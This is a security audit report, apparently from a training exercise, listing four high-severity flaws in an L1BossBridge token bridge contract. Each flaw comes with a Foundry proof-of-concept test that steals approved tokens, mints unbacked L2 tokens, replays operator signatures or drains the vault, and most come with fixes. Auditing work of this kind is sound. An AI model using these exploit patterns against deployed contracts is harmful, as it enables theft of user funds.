### [H-1] Users who give tokens approvals to `L1BossBridge` may have those assets stolen

**Description:**
The `depositTokensToL2` function allows anyone to call it with a  `from` address of any account that has approved tokens to bridge.

<details>

<summary>Code<summary>

```javascript
function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused
```
</details>

As a consequence, an attacker can move tokens out of any victim account whose token allowance to the bridge is greater than zero. This will move the tokens into the bridge vault, and assign them to the attacker's address in L2.


**Impact:** Funds will be stolen from the victim account.

**Proof of Concept**

<details>

<summary>Code<summary>

```javascript
  function testCanMoveApprovedTokensOfOtherUsers() public{
        vm.prank(user);
        token.approve(address(tokenBridge), 1000e18);

        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attacker, 1000e18);
        tokenBridge.depositTokensToL2(user, attacker, 1000e18);

        assertEq(token.balanceOf(user),0);
        assertEq(token.balanceOf(address(vault)),1000e18);
        vm.stopPrank();
    }
```
</details>


**Recommended Mitigation:** Consider modifying the  `depositTokensToL2` function to only allow the caller to move tokens from their own account. 



```diff
   
-   function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused

+   function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused    
       {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
-        token.safeTransferFrom(from, address(vault), amount);
+        token.safeTransferFrom(msg.sender, address(vault), amount);

        
-        emit Deposit(from, l2Recipient, amount);
+        emit Deposit(msg.sender, l2Recipient, amount);
    }



```

### [H-2] Calling `depositTokensToL2` from the vault contract to the vault contract allows infinite mining of unbacked tokens.

**Description:** `depositTokensToL2` function allows the caller to specify the `from` address, from which tokens are taken. 

Because the vault grants infinite approval to the bridge already(in contsructor), it is possible for an attacker to call the depositTokensToL2 function and transfer tokens from the vault to the vault itself. This would allow the attacker to trigger the `Deposit` event any number of times, presumably causing the minting of unbacked tokens in l2.

**Impact:**

**Proof of Concept**

```javascript

<details>



   function testCanTransferFromVaultToVault() public {
         address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        uint256 vaultBalance = 500 ether;
        deal(address(token), address(vault), vaultBalance);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
        //2nd Time
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
        //3rdTime
         vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
    }
    
</details>

```

**Recommended Mitigation:** Same as H-1, consider modifying the  `depositTokensToL2` function to only allow the caller to move tokens from their own account. 

### [H-3] Lack of replay protection in `withdrawtokensToL1` allows withdrawls by signature to be replayed.

**Description:** Users who want to withdraw tokens from bridge can call the function `sendtoL1` or the wrapper function `withdrawtokensToL1`. These functions require the caller to send along some withdrawl data signed by one of the approved bridge operators. 

However, the signatures do ot include any kind of replay-protection mechanism. Therefore, valid signatures from any bridge operator can be resued by any attacker to continue executing withdralws until the vault is completely drained.

**Impact:**

**Proof of Concept** 

```javascript

<details>

 function testSignatureReplay() public {

        address attacker = makeAddr("attacker");
        uint256 vaultInitialBalance = 1000e18;
        uint256 attackerInititialBalance = 100e18;
        deal(address(token), address(vault), vaultInitialBalance);
        deal(address(token), attacker, attackerInititialBalance);

        vm.startPrank(attacker);
        token.approve(address(tokenBridge), 100e18);
        tokenBridge.depositTokensToL2(attacker, attacker, 100e18);

        bytes memory message = abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInititialBalance)));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key,  MessageHashUtils.toEthSignedMessageHash(keccak256(message)));

        while(token.balanceOf(address(vault)) > 0){
            tokenBridge.withdrawTokensToL1(attacker, attackerInititialBalance, v, r, s);
        }

            assertEq(token.balanceOf(address(attacker)), attackerInititialBalance + vaultInitialBalance);
        
    }



</details>




```




### [H-4] `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds

**Description:** The `L1BossBridge` contract includes the `sendToL1` function that, if called with a valid signature by an operator, can execute arbitary low-level cals to any given target. Because there is no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the `L1Vault` contract. 

The L1BossBridge contract owns the L1Vault contract. Therefore, an attacker could submit a call that targets the vault and executes is approveTo function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.



**Impact:**

**Proof of Concept** 

```javascript

<details>

 function testCanCallVaultApproveFormBridgeAndDrainVault() public {
        address attacker = makeAddr("attacker");
        uint256 vaultInitialBalance = 500e18;

        deal(address(token), address(vault), vaultInitialBalance);

        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(attacker), address(0), 0);
        tokenBridge.depositTokensToL2(attacker, address(0), 0);
        bytes memory message = abi.encode(
            address(vault),
            0,
            abi.encodeCall(
                L1Vault.approveTo,
                ((attacker), token.balanceOf(address(vault)))
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
            operator.key,
            MessageHashUtils.toEthSignedMessageHash(keccak256(message))
        );

        tokenBridge.sendToL1(v, r, s, message);
        token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));

        console2.log(token.balanceOf(attacker));
    }


</details>


```

**Recommended Mitigation:** Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the L1Vault contract.

